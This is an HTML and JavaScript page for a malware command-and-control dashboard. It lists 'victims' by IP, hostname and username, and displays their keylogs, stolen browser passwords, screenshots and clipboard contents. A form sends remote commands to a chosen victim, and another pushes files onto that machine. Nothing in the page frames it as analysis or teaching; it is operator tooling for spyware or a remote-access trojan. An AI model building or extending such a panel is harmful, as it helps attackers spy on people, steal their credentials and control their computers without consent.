<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>C2 Dashboard</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css">
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://cdn.socket.io/4.0.0/socket.io.min.js"></script>
</head>
<body>
<div class="container-fluid mt-3">
    <h1>C2 Dashboard</h1>
    <div class="row">
        <div class="col-md-3">
            <ul class="nav flex-column">
                <li class="nav-item"><a class="nav-link active" href="#" onclick="showTab('victims')">Victims</a></li>
                <li class="nav-item"><a class="nav-link" href="#" onclick="showTab('keylogs')">Keylogs</a></li>
                <li class="nav-item"><a class="nav-link" href="#" onclick="showTab('passwords')">Passwords</a></li>
                <li class="nav-item"><a class="nav-link" href="#" onclick="showTab('screenshots')">Screenshots</a></li>
                <li class="nav-item"><a class="nav-link" href="#" onclick="showTab('clipboard')">Clipboard</a></li>
                <li class="nav-item"><a class="nav-link" href="#" onclick="showTab('commands')">Commands</a></li>
                <li class="nav-item"><a class="nav-link" href="#" onclick="showTab('files')">Files</a></li>
            </ul>
        </div>
        <div class="col-md-9">
            <div id="victims-tab" class="tab-content">
                <table class="table table-striped">
                    <thead>
                        <tr>
                            <th>ID</th>
                            <th>IP</th>
                            <th>Hostname</th>
                            <th>Username</th>
                            <th>OS</th>
                            <th>Last Seen</th>
                            <th>Status</th>
                        </tr>
                    </thead>
                    <tbody id="victims-table-body">
                    </tbody>
                </table>
            </div>
            <div id="keylogs-tab" class="tab-content" style="display:none;">
                <h2>Keylogs</h2>
                <div id="keylogs-output"></div>
            </div>
            <div id="passwords-tab" class="tab-content" style="display:none;">
                <h2>Passwords</h2>
                <div id="passwords-output"></div>
            </div>
            <div id="screenshots-tab" class="tab-content" style="display:none;">
                <h2>Screenshots</h2>
                <div id="screenshots-output"></div>
            </div>
            <div id="clipboard-tab" class="tab-content" style="display:none;">
                <h2>Clipboard</h2>
                <div id="clipboard-output"></div>
            </div>
            <div id="commands-tab" class="tab-content" style="display:none;">
                <h2>Commands</h2>
                <form id="command-form">
                    <div class="mb-3">
                        <label for="command-input" class="form-label">Command:</label>
                        <input type="text" class="form-control" id="command-input">
                    </div>
                    <button type="submit" class="btn btn-primary">Send</button>
                </form>
                <div id="commands-output"></div>
            </div>
            <div id="files-tab" class="tab-content" style="display:none;">
                <h2>Files</h2>
                <form id="upload-form" enctype="multipart/form-data">
                    <div class="mb-3">
                        <label for="file-input" class="form-label">Upload File:</label>
                        <input type="file" class="form-control" id="file-input">
                    </div>
                    <button type="submit" class="btn btn-primary">Upload</button>
                </form>
                <div id="files-output"></div>
            </div>
        </div>
    </div>
</div>

<script>
let socket = io('http://localhost:8000');
let currentVictimId = null;

function showTab(tabName) {
    // Hide all tabs
    document.querySelectorAll('.tab-content').forEach(el => el.style.display = 'none');
    // Show selected tab
    document.getElementById(`${tabName}-tab`).style.display = 'block';
    
    if (tabName === 'victims') {
        loadVictims();
    } else if (tabName === 'keylogs') {
        loadKeylogs(currentVictimId);
    } else if (tabName === 'passwords') {
        loadPasswords(currentVictimId);
    } else if (tabName === 'screenshots') {
        loadScreenshots(currentVictimId);
    } else if (tabName === 'clipboard') {
        loadClipboard(currentVictimId);
    } else if (tabName === 'commands') {
        loadCommands(currentVictimId);
    } else if (tabName === 'files') {
        loadFiles(currentVictimId);
    }
}

function loadVictims() {
    fetch('/api/victims')
        .then(response => response.json())
        .then(data => {
            const tbody = document.getElementById('victims-table-body');
            tbody.innerHTML = '';
            data.forEach(victim => {
                const row = tbody.insertRow();
                row.insertCell().textContent = victim.id;
                row.insertCell().textContent = victim.ip;
                row.insertCell().textContent = victim.hostname;
                row.insertCell().textContent = victim.username;
                row.insertCell().textContent = victim.os;
                row.insertCell().textContent = victim.last_seen;
                row.insertCell().textContent = victim.status;
            });
        });
}

function loadKeylogs(victimId) {
    fetch(`/api/keylogs/${victimId}`)
        .then(response => response.json())
        .then(data => {
            const output = document.getElementById('keylogs-output');
            output.innerHTML = '';
            data.forEach(log => {
                const div = document.createElement('div');
                div.textContent = `Window: ${log.window_title}\nKeys: ${log.keys}`;
                output.appendChild(div);
            });
        });
}

function loadPasswords(victimId) {
    fetch(`/api/passwords/${victimId}`)
        .then(response => response.json())
        .then(data => {
            const output = document.getElementById('passwords-output');
            output.innerHTML = '';
            data.forEach(password => {
                const div = document.createElement('div');
                div.textContent = `URL: ${password.url}\nUsername: ${password.username}\nPassword: ${password.password}`;
                output.appendChild(div);
            });
        });
}

function loadScreenshots(victimId) {
    fetch(`/api/screenshots/${victimId}`)
        .then(response => response.json())
        .then(data => {
            const output = document.getElementById('screenshots-output');
            output.innerHTML = '';
            data.forEach(screenshot => {
                const img = document.createElement('img');
                img.src = `data:image/jpeg;base64,${screenshot.image}`;
                output.appendChild(img);
            });
        });
}

function loadClipboard(victimId) {
    fetch(`/api/clipboard/${victimId}`)
        .then(response => response.json())
        .then(data => {
            const output = document.getElementById('clipboard-output');
            output.innerHTML = '';
            data.forEach(item => {
                const div = document.createElement('div');
                div.textContent = item.text;
                output.appendChild(div);
            });
        });
}

function loadCommands(victimId) {
    fetch(`/api/commands/${victimId}`)
        .then(response => response.json())
        .then(data => {
            const output = document.getElementById('commands-output');
            output.innerHTML = '';
            data.forEach(command => {
                const div = document.createElement('div');
                div.textContent = `Command: ${command.command}\nResult: ${command.result}`;
                output.appendChild(div);
            });
        });
}

function loadFiles(victimId) {
    fetch(`/api/files/${victimId}`)
        .then(response => response.json())
        .then(data => {
            const output = document.getElementById('files-output');
            output.innerHTML = '';
            data.forEach(file => {
                const div = document.createElement('div');
                div.textContent = `Filename: ${file.filename}`;
                output.appendChild(div);
            });
        });
}

document.getElementById('command-form').addEventListener('submit', function(e) {
    e.preventDefault();
    const command = document.getElementById('command-input').value;
    fetch(`/api/command/${currentVictimId}`, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({command})
    });
});

document.getElementById('upload-form').addEventListener('submit', function(e) {
    e.preventDefault();
    const formData = new FormData();
    formData.append('file', document.getElementById('file-input').files[0]);
    fetch(`/api/upload_file/${currentVictimId}`, {
        method: 'POST',
        body: formData
    });
});

socket.on('keylog', function(data) {
    console.log('Keylog:', data);
});

socket.on('password', function(data) {
    console.log('Password:', data);
});

socket.on('screenshot', function(data) {
    console.log('Screenshot:', data);
});

socket.on('clipboard', function(data) {
    console.log('Clipboard:', data);
});
</script>
</body>
</html>
